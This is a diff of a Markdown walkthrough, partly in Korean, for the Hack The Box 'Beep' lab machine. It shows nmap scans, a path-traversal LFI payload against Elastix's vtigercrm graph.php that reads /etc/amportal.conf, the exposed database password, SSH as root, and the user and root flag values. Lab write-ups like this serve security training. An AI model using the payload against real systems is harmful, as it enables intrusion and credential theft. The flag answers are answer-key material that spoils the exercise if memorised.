@@ -1,131 +1,124 @@
 
 # HTB Walkthrough - Beep
 
-**Machine Name**: Beep  
-**Target IP**: 10.129.229.183
+**Machine:** Beep  
+**Target IP:** 10.129.229.183
 
 ---
 
-## Task 1: Linux Distribution
+## Task 1  
+**Which Linux distribution is the target machine running?**
 
-**Scan Command**:
 ```
-nmap -sV -sC 10.129.229.183
-```
+nmap -sV -sC -oA nmap/OpenAdmin 10.129.23.96
 
-**Result**:
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.2.3
+|_http-server-header: Apache/2.2.3 (CentOS)
 ```
-http-server-header: Apache/2.2.3 (CentOS)
-```
+![nmap](img/nmap.png)
 
-**Answer**: `CentOS`
+**Answer:** `CentOS`
 
 ---
 
-## Task 2: TLS Version on Port 443
+## Task 2  
+**What version of TLS is the web application on TCP port 443 using?**
 
-**Scan Command**:
 ```
 nmap --script ssl-enum-ciphers -p 443 10.129.229.183
-```
-
-**Result**:
-```
 TLSv1.0
 ```
+![TLS_V](img/TLS_V.png)
 
-**Answer**: `1.0`
-
----
-
-## Task 3: Webserver Software on 443
-
-**Browser Access**:
-```
-https://10.129.229.183/
-```
-
-**Result**: 
-```
-Elastix - Login page
-```
-
-**Answer**: `Elastix`
+**Answer:** `1.0`
 
 ---
 
-## Task 4: LFI Vulnerable Endpoint
+## Task 3  
+**What is the name of the software that's hosting a webserver on 443?**
 
-**Exploit Reference**: https://www.exploit-db.com/exploits/37637
+```
+http-title: Elastix - Login page
+```
+![webpage](img/webpage.png)
 
-**Endpoint**:
-```
-/vtigercrm/graph.php
-```
-
-**Example Exploit**:
-```
-/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
-```
-
-**Answer**: `/vtigercrm/graph.php`
+**Answer:** `Elastix`
 
 ---
 
-## Task 5: FreePBX Config File with DB Credentials
+## Task 4  
+**Which Elastix endpoint is vulnerable to a Local File Inclusion?**
 
-**LFI Result**:
-Accessing `/etc/amportal.conf` reveals:
+- 브라우저가 TLS 1.0을 지원하지 않아 Firefox로 전환.
+- `about:config` 에서 `security.tls.version.min` 값을 `3` → `1` 로 수정.
+- 취약점 정보: https://www.exploit-db.com/exploits/37637
+![LFI](img/LFI.png)
 
 ```
+LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
+```
+
+**Answer:** `/vtigercrm/graph.php`
+
+---
+
+## Task 5  
+**What is the name of the FreePBX configuration file that contains the database configuration?**
+
+LFI로 `/etc/amportal.conf` 파일 접근 가능. 아래와 같은 정보가 노출됨:  
+![conf](img/conf.png)
+
+```
+AMPDBHOST=localhost
+AMPDBENGINE=mysql
+AMPDBNAME=asterisk
 AMPDBUSER=asteriskuser
 AMPDBPASS=jEhdIekWmdjE
 ```
 
-**Answer**: `amportal.conf`
+**Answer:** `amportal.conf`
 
 ---
 
-## Task 6: SSH Key Exchange Compatibility Fix
+## Task 6  
+**What additional flag is needed when attempting to SSH as root to the target machine due to a "no matching key exchange method found" error?**
 
-**Error**:
+SSH 에러 발생:
 ```
-Unable to negotiate: no matching key exchange method found.
+Unable to negotiate with 10.129.67.153 port 22: no matching key exchange method found.
+Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,...
 ```
 
-**Fix**:
+SSH 접속 명령어 수정:
 ```
 ssh -oKexAlgorithms=+diffie-hellman-group14-sha1 root@10.129.67.153
 ```
 
-**Answer**: `-oKexAlgorithms=+diffie-hellman-group14-sha1`
+**Answer:** `-oKexAlgorithms=+diffie-hellman-group14-sha1`  
+![root](img/root.png)
 
 ---
 
-## User Flag
+## Submit User Flag  
+**Location:** `/home/fanis/user.txt`  
+![flag](img/flag.png)
 
-**Command**:
 ```
 cat /home/fanis/user.txt
-```
-
-**Answer**:
-```
 c5b6bb43f6d2a1f1d84b698e0e32dcbf
 ```
 
+**Answer:** `c5b6bb43f6d2a1f1d84b698e0e32dcbf`
+
 ---
 
-## Root Flag
+## Submit Root Flag  
+**Location:** `/root/root.txt`
 
-**Command**:
 ```
 cat /root/root.txt
-```
-
-**Answer**:
-```
 18c457ee30e36677778fe36b29518c8d
 ```
 
----
+**Answer:** `18c457ee30e36677778fe36b29518c8d`
